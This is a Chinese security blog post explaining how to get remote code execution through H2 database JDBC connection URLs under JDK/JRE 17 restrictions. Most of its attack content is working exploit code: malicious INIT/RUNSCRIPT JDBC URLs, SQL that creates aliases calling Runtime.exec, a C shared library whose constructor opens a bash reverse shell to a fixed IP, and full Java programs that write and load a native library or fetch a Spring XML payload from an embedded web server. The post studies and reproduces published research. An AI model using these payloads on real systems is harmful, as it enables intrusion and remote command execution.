---
title: "JRE 17受限环境下的h2 jdbc attack"
onlyTitle: true
date: 2025-5-6 17:43:06
categories:
- java
- other漏洞
tags:
- JDBC
- jdk 17
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8154.jpg
---



最近看了很多安全文章，发现JDK17下对漏洞姿势的影响还挺大的，通过X1r0z大佬的H2 JDBC Attack学习一下绕过JDK17限制的手法，X1r0z大佬的原文如下：

https://wx.zsxq.com/group/2212251881/topic/8852554542842222



## JDK 17下的RCE限制

现在很多主流框架，比如springBoot 3.x用的jdk版本至少是jdk17，在jdk17及之后无法反射调用`java.*`包下非public修饰的属性和方法。springboot自带的h2数据库也受到此影响，导致h2 jdbc attack 有任意代码执行时利用受限。

比如，用反射调用java.lang.ClassLoader#defineClass时，JDK9-16只有警告，而JDK 17+会报`Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int) throws java.lang.ClassFormatError accessible: module java.base does not "opens java.lang" to unnamed module`的错误

```java
String payload = '恶意的base64'


byte[] decode = Base64.getDecoder().decode(payload);


Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
Class evil = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "恶意文件名字", decode, 0, decode.length);
```

defineClass受到限制，而TemplatesImpl就是依赖于defineClass的，导致TemplatesImpl直接在JDK 17+被移除

安全好兄弟直接似了

## H2 JDBC Attack

我们通过h2database JDBC Attack来看一下，真实环境下的JDK 17+如何达到漏洞利用。为了方便调试还是在IDEA中打，而不是用web Console

随便贴上一个h2database的依赖

```xml
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <scope>runtime</scope>
</dependency>
```

无JDK版本限制通用打jdbc Attack：

```java
public class H2database_JDBC_Client {
    public static void main(String[] args) throws Exception {
        String ClassName = "org.h2.Driver";
        String JDBC_Url = "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/poc.sql'";
        String username = "root";
        String password = "root";
        Class.forName(ClassName);
        Connection connection = DriverManager.getConnection(JDBC_Url, username, password);
    }
}
```

本地http暴露一个poc.sql：

```sql
DROP ALIAS IF EXISTS shell;
CREATE ALIAS shell AS $$void shell(String s) throws Exception {
    java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('cmd /c calc');
```

因为我们使用的POC需要执行两个SQL语句,第一个是CREATE ALIAS,第二个是EXEC,这是两个步骤。`session.prepareCommand`不支持多个 sql 语句执行。 因此,我们使用 RUNSCRIPT 从远程服务器加载 sql。

`$$ ... $$`这是 H2 用于定义多行字符串（类似 PostgreSQL）的语法，包裹的内容会被作为函数体进行编译。

能够顺利弹出计算器，因为根本没有反射去利用`java.*`包下非public修饰的属性和方法。不过需要出网

### JDK11下的h2

对于H2 < 1.4.198，可以直接使用网上公开的JDBC Attack URL 

对于H2 < 2.0.206，可以使用JNDI注入 

对于H2 < 2.1.210，可以使用下面的POC，见下一节

对于H2 >= 2.1.210，Web console需要找一个已经存在的数据库文件才能利用。 对于非Web console环境，没有版本限制

### h2 最新版本 JDK11-16

H2 WebConsole < 2.1.210或者非WebConsole(代码or配置文件环境) 的最新版本(2.3.232)，JDK 11-16的情况下，h2database有三种利用方法：

>Litch1 翻了 `CREATE ALIAS` 实现的源代码，发现在 SQL 语句中对于 JAVA 方法的定义被交给了源代码编译器。有三种支持的编译器：Java/Javascript/Groovy
>
>h2数据库最低只支持JDK11，所以再见了JDK8

1. CREATE TRIGGER + javascript

```sql
jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
    java.lang.Runtime.getRuntime().exec("calc.exe")
$$;AUTHZPWD=\
```

在H2内存数据库中创建一个触发器 TRIG_JS，该触发器在向 INFORMATION_SCHEMA.TABLES 表插入数据后执行。触发器的主体是一个JavaScript脚本，而且在编译源代码时，同时还会eval源代码。

上述payload原理来自[FORBID_CREATION 绕过（CVE-2022-23221）](https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html#forbid_creation-cve-2022-23221)

2. CREATE ALIAS + Groovy AST

```sql
jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;init=CREATE ALIAS shell2 AS
$$@groovy.transform.ASTTest(value={
assert java.lang.Runtime.getRuntime().exec("cmd.exe /c calc.exe")
})
def x$$;AUTHZPWD=\
```

目标机器有groovy依赖，能打AST注解

如何触发groovy可见：https://su18.org/post/jdbc-connection-url-attack/

简单说来就是通过如下前缀判断是否为groovy代码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1630916970678.png)



到这里我们可以思考一下，前两种利用方式。CREATE TRIGGER + javascript是创建触发器时编译并执行了javascript代码，CREATE ALIAS + Groovy AST的 `value={}` 中的代码会在编译阶段运行，用于测试 AST 或执行验证。所以实际上都是用一条init完成了执行代码。这两种方式适用于目标不出网的情况下执行命令，不过一般不能回显

3. CREATE ALIAS + Java

这个就是上面提到的RUNSCRIPT的方式，可以执行多行代码。我们给他加上一个bypass 无数据库场景的payload

```sql
jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/poc.sql';AUTHZPWD=\
```

```sql
DROP ALIAS IF EXISTS shell;
CREATE ALIAS shell AS $$void shell(String s) throws Exception {
    java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('cmd /c calc');
```



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250505142833640.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250505153855105.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250505153918375.png)

### JRE 17+

如果Jre17 +版本下呢？我们再来看上面三种利用方法：

1. CREATE TRIGGER + javascript：Java 自带的 Nashorn JavaScript 引擎已经在 Java 15 往后被删除
2. CREATE ALIAS + Groovy AST：大部分环境都不存在groovy依赖
3. CREATE ALIAS + Java：注意我们主页里指的JRE 17而不是JDK 17，JRE 17没用javac命令，不能通过RUNSCRIPT + CREATE ALIAS 语句动态编译 Java 源代码

不过H2 CREATE ALIAS可以调用位于 classpath 内的某个公共类的公共静态方法

https://h2database.com/html/features.html

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250506131736954.png)

由此，X1r0z师傅给出了两种利用方式，而这两种思路在JDK 17+几乎是通用的

#### 写文件+System.load

1. 利用 File.createTempFile 创建临时文件
2. 利用 commons-io 的 FileUtils 分块写文件
3. 利用 commons-beanutils 的 MethodUtils 反射调用实例/静态方法
4. 利用 System.load 加载动态链接库

具体的涉及到的几个问题：为什么要用commons-io写文件而不用java自带的方法，为什么用commons-beanutils反射调用getAbsolutePath，和为什么不反射调用java.lang.Runtime.getRuntime().exec(cmd)的原因请见原文：https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce

这里仅做一个对h2的复现

首先编写exp.c：

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i >& /dev/tcp/100.109.34.110/4444 0>&1'");
}
```

测试记得改成calc，Linux编译为so，windows编译为dll

```编译
# Linux amd64
gcc -shared -fPIC exp.c -o exp.so
# Windows x64
gcc -shared exp.c -o exp.dll
```

我这里为了通用，改成了java版本

```java
package org.h2jdbc;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.ArrayList;
import java.util.List;

public class H2database_JDBC_Client {
    public static void main(String[] args) throws Exception {
        String ClassName = "org.h2.Driver";
        String JDBC_Url = buildExploitJdbcUrl("test","E:\\CODE_COLLECT\\Idea_java_ProTest\\H2JDBC\\src\\main\\resources\\exp.dll");
        String username = "root";
        String password = "root";
        Class.forName(ClassName);
        Connection connection = DriverManager.getConnection(JDBC_Url, username, password);
    }
    public static String buildExploitJdbcUrl(String prefix, String libPath) throws IOException {
        List<String> sqlList = new ArrayList<>();

        // Drop existing aliases
        sqlList.add("DROP ALIAS IF EXISTS CREATE_FILE");
        sqlList.add("DROP ALIAS IF EXISTS WRITE_FILE");
        sqlList.add("DROP ALIAS IF EXISTS INVOKE_METHOD");
        sqlList.add("DROP ALIAS IF EXISTS INVOKE_STATIC_METHOD");
        sqlList.add("DROP ALIAS IF EXISTS CLASS_FOR_NAME");

        // Create new aliases for Java methods
        sqlList.add("CREATE ALIAS CREATE_FILE FOR \"java.io.File.createTempFile(java.lang.String, java.lang.String)\"");
        sqlList.add("CREATE ALIAS WRITE_FILE FOR \"org.apache.commons.io.FileUtils.writeByteArrayToFile(java.io.File, byte[], boolean)\"");
        sqlList.add("CREATE ALIAS INVOKE_METHOD FOR \"org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object[])\"");
        sqlList.add("CREATE ALIAS INVOKE_STATIC_METHOD FOR \"org.apache.commons.beanutils.MethodUtils.invokeExactStaticMethod(java.lang.Class, java.lang.String, java.lang.Object)\"");
        sqlList.add("CREATE ALIAS CLASS_FOR_NAME FOR \"java.lang.Class.forName(java.lang.String)\"");

        // Create temp file
//        sqlList.add(String.format("SET @file=CREATE_FILE('%s', '.so')", prefix));
        sqlList.add(String.format("SET @file=CREATE_FILE('%s', '.dll')", prefix));

        // Read .so file and hex encode
        byte[] fileBytes = Files.readAllBytes(new File(libPath).toPath());
        String hex = bytesToHex(fileBytes);

        // Chunked write (e.g., 500 chars = 250 bytes)
        int chunkSize = 500;
        for (int i = 0; i < hex.length(); i += chunkSize) {
            String chunk = hex.substring(i, Math.min(i + chunkSize, hex.length()));
            sqlList.add(String.format("CALL WRITE_FILE(@file, X'%s', TRUE)", chunk));
        }

        // Get path and load library
        sqlList.add("SET @path=INVOKE_METHOD(@file, 'getAbsolutePath', null)");
        sqlList.add("SET @clazz=CLASS_FOR_NAME('java.lang.System')");
        sqlList.add("CALL INVOKE_STATIC_METHOD(@clazz, 'load', @path)");

        // Combine all SQLs into H2 INIT format
        StringBuilder init = new StringBuilder();
        for (String stmt : sqlList) {
            init.append(stmt).append("\\;");
        }

        // Final JDBC URL
        String jdbcUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + init;
        System.out.println(jdbcUrl);
        return jdbcUrl;
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}

```

注意此处payload是代码环境，webConsole环境依旧需要数据库存在，或者用前面的`FORBID_CREATION=FALSE;`去绕过webConsole对数据库的检测

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250506143227719.png)

#### ClassPathXmlApplicationContext

1. 利用 commons-beanutils 的 ConstructorUtils 实例化 ClassPathXmlApplicationContext
2. XML 内调用 ProcessBuilder.start 执行命令

需要找到一个能调用构造函数的静态方法，commons-beansutils真是牛逼啊，提供了反射调用 实例方法、静态方法、构造函数 这三种函数的静态调用，很夸张

```java
public static <T> T invokeConstructor(Class<T> klass, Object arg) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
    Object[] args = toArray(arg);
    return invokeConstructor(klass, args);
}
```

```java
package org.h2jdbc;

import java.sql.Connection;
import java.sql.DriverManager;
import java.util.ArrayList;
import java.util.List;

public class H2database_JDK17_ClassPathXmlApplicationContext {
    public static void main(String[] args) throws Exception {
        String ClassName = "org.h2.Driver";
        String JDBC_Url = buildExploitJdbcUrl();
        String username = "root";
        String password = "root";
        Class.forName(ClassName);
        Connection connection = DriverManager.getConnection(JDBC_Url, username, password);
    }
    public static String buildExploitJdbcUrl() throws Exception {
        List<String> sqlList = new ArrayList<>();

        // Spring XML Payload
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "   xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                "        <constructor-arg>\n" +
                "        <list>\n" +
                "            <value>calc</value>\n"+
                "        </list>\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "</beans>";

        // Serve XML file using embedded HTTP server
        byte[] xmlBytes = xml.getBytes("UTF-8");
        WebServer server = WebServer.getInstance();
        server.serveFile("/exp.xml", xmlBytes);

        String ip = server.ip;
        int port = server.port;
        String xmlUrl = "http://" + ip + ":" + port + "/exp.xml";

        // H2 SQL INIT statement construction
        sqlList.add("DROP ALIAS IF EXISTS INVOKE_CONSTRUCTOR");
        sqlList.add("DROP ALIAS IF EXISTS INVOKE_METHOD");
        sqlList.add("DROP ALIAS IF EXISTS URI_CREATE");
        sqlList.add("DROP ALIAS IF EXISTS CLASS_FOR_NAME");

        sqlList.add("CREATE ALIAS INVOKE_CONSTRUCTOR FOR 'org.apache.commons.beanutils.ConstructorUtils.invokeConstructor(java.lang.Class, java.lang.Object)'");
        sqlList.add("CREATE ALIAS INVOKE_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object[])'");
        sqlList.add("CREATE ALIAS URI_CREATE FOR 'java.net.URI.create(java.lang.String)'");
        sqlList.add("CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)'");

        sqlList.add("SET @uri=URI_CREATE('" + xmlUrl + "')");
        sqlList.add("SET @xml_url_obj=INVOKE_METHOD(@uri, 'toString', NULL)");
        sqlList.add("SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext')");
        sqlList.add("SELECT INVOKE_CONSTRUCTOR(@context_clazz, @xml_url_obj)");

        // Combine the SQL list with escaped `\;` separators
        String initSql = String.join("\\;", sqlList) + "\\;";
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + initSql;

        return url;
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}
```

辅助类WebServer

```java
package org.h2jdbc;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.Map;

public class WebServer {

    public final String ip;
    public final int port;

    private static WebServer instance;
    private final HttpServer server;
    private final Map<String, byte[]> fileMap = new HashMap<>();

    private WebServer() throws Exception {
        // 使用 localhost 的本地 IP 和随机端口
        this.ip = InetAddress.getLocalHost().getHostAddress();
        this.port = 8000 + (int)(Math.random() * 1000); // 可根据需要修改范围

        this.server = HttpServer.create(new InetSocketAddress(port), 0);
        this.server.createContext("/", new FileHandler());
        this.server.setExecutor(null); // 使用默认线程池
        this.server.start();
        System.out.println("WebServer started at http://" + ip + ":" + port);
    }

    // 单例实例获取
    public static synchronized WebServer getInstance() throws Exception {
        if (instance == null) {
            instance = new WebServer();
        }
        return instance;
    }

    // 注册路径与文件内容
    public void serveFile(String path, byte[] content) {
        fileMap.put(path, content);
        System.out.println("Serving " + path);
    }

    // 处理 HTTP 请求
    private class FileHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) {
            try {
                String path = exchange.getRequestURI().getPath();
                byte[] content = fileMap.getOrDefault(path, "404 Not Found".getBytes());
                exchange.sendResponseHeaders(content == null ? 404 : 200, content.length);
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(content);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
```

中间有一些小小的调试过程，比如修改invokeMethod的参数为Object[]之类的，我直接贴代码就省略说明了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250506173634051.png)

在Tomcat环境下，可以进一步利用Tomcat临时文件达到不出网ClassPathXmlApplicationContext的利用，具体见：

https://godownio.github.io/2025/04/17/tomcat-xia-classpathxmlapplicationcontext-de-bu-chu-wang-li-yong/

虽然两个都用到了commons-beanutils，spring环境下这个依赖非常常见。不过在非h2环境下，可以直接调用实例方法而非只能调静态方法，就无需commons-beanutils依赖，这两种思路在jre 17下都很奏效



REF :https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html

https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce

​                                      
